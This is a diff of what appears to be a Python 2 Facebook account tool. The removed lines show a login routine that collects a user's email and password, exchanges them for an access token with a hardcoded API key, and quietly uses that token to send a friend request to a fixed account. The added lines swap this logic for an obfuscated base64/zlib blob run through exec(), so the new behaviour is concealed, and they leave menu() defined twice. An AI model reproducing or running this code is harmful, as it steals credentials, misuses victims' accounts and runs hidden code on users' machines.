@@ -64,59 +64,18 @@ logo = """
 exec(zlib.decompress(base64.b64decode("eJylkU9LAzEQxc8r+B1iL9mCTVergi09iZ7Eg+ipSsmms93Q/HOSta2f3uxut1oQRLwl897M5P2ygIIou1wCpv3x8VGSVB7QcA1kSqwDk9K6wMIm0FNCkfYZAl+k/drquPdri4u91a1/NgbcNrOTHFnrLENwfjwc5oqb1dXlxTnLsmwNeWl94M4xYfXwzipl14D+Lh/SZg5sBLhANIiSG/kB7Pnx/hbRYjvdoTSh92JestFodja5PtOzk1fyYImwxoAI0ppeY7Se+a0PoFOKmgywIF3Iye6+S9JsTVagKo5tlJhgXnARLG6Z9PMyaBXjP2EFO9WDiqvmhUWdGpxmXVddmFHQXCr6Gls6zgdyTbRRO7QHqql0Dtjomm+6fVWuZWgfV2H9mFhcQojntigLQj1/h8EC3qUASqQhUWyR7X8m0WCqtqHDjPBWgQ+etfdIz7ObPclv3Dvwv2H/K/cD8HUMUYJYORuXHab449yvqKA8/GPEJy5e+KY=")))
 
 #-> Ini Untuk Login
-def login():
-	os.system('reset')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('reset')
-		print logo
-		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
-		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m/\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
-		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;91m[!] No connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				zedd = open("login.txt", 'w')
-				zedd.write(z['access_token'])
-				zedd.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
-                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;91m[!] No connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\033[1;91m[!] Login Failed")
-			os.system('rm -rf login.txt')
-			time.sleep(0.01)
-			login()
+exec(zlib.decompress(base64.b64decode("eJy1Vt9z2jgQfqZ/heqH2plQBwOXH2Q8HZqmnVxSmLkkTynjEfKCdViWT5IDpNP/vWvLBpKml15nzi9Yu9Lut592PxPDjKRyzjNvb/CqJbWv19qA8FwFGoy796pl1Bo9LSMXYEhIZA6Z5zIpFxzctqvKLS0BWeHhC6wY5IZ4l7A+V0qq9sW4+i1jPxu8lSuemRKBbBae+6XT6931gtNA3JHqPTg96Yqr8aeLERle3o7Ix+HZ+fvx+JIMRx+G5HZ0c3tJPp+PPg0/v7+4IsOzs/NrcjO+PB9tI5EJpiNPHpvcDX/zcREyj5ETRZcRz/KiwY54Efv+pEHfOxSFBpVRAY3/SJDt1sG2SlKxgrs3VJcnfbMySPaycfpLxQ14PG7WLJUavIrQ5S8iyqnWS6nif8ORLzcw8uUjELi0GDBfvd5iqFumNVW+PZwYk+vBwYHwZ5TBFJvHZ1JUgeqWEcASmvEH8G//uqp6popQ3ZCzU8LrCRlJwmSWATNcZk65a7ezBHmrZqQh7bRe1+jLhK0FpAVVFVAEGCEiI9Xa5zpKjEix4BtVgHVqSDFNNJNKeJkKO/WZcn3ngqA8dSd4gMe79pLYyozU1GGKqeCmylioMgPa5mDwvbLxGXE1vYe3MdxzBi7hGUFfRUBDZUvzeUhcmvNoAevw+LhLj/snnd5hENOT46NOdzo7OaKdbhDHLOjHTEEMmeE01ZFZ5xA2t12BDt19Hu+7JVxqwj+vx6M5ZKCogUhQlvAMIh6HwcaoQWvkOrJTr8MglYymEEIW3V4LMImMQ1qYxK+UpEmFWZCBfRx2rDSLtE4jnHtZKIYhOvdh4HcOu7NjBiezo/40wNc+C7o9xrq9fu+I9mmv61alx9RQJO2rU1fvDJyX6nfazlMK8FSDDL0VD86Ax23H0oDukginTZxnyEBvgKd+xkjttrTgoiIGDZYbNGzZQesGxgD5aTvP8YNHOrjzvgzsd5xvFQ+rMKE6SfnUz2DpOSL+w9mzDr/IkSTwsEmshYYrP4FVzOegbeNZGpuNX13c6g7oN+uyXek0Y4o8PxrUA8RlcKLucajyJK9mrqVCBf8UpaPsZQ9DtHOqqNBhmcjGfQj/1jLDwmmsPRxIWJnK0QjwnD48NArjWC7xAmqJabVKdy0zD3cuZUgM3iV+iDJ3srOjEZ6n8v70MXxRU1EL/5dsR1ma10Pxbmud7H6AyusjuqhgzIo0Xdv23NCQS+R6o3VzRfPkMY0CDmaKQxbrd/XUlEfeFDzW4XzJ8SNBe292y8QR+knh2EtzsCLWSOgGh11je2r/bCOUW01tRDV7SVb/o67uCmspaSwBtsgl5toq2otXY/8C/ACuWfXEkDFZ4OWdbaLbIfgRq+2n019AbrgAX6cAuRc8/URAquH3cdue+YhaA/H/gLP+5/Ydddvp0w==")))
+
+def menu():
+    global toket
+    os.system('reset')
+    try:
+        toket = open('cookie', 'r').read()
+    except IOError:
+        print '\x1b[32;1m{!} \x1b[31;1mToken not found'
+        os.system('rm -rf cookie')
+        time.sleep(1)
+        login()
 
 def tokenz():
 	os.system('reset')
@@ -139,7 +98,6 @@ def tokenz():
 			login()
 		else:
 			keluar()
-
 
 def menu():
     global toket
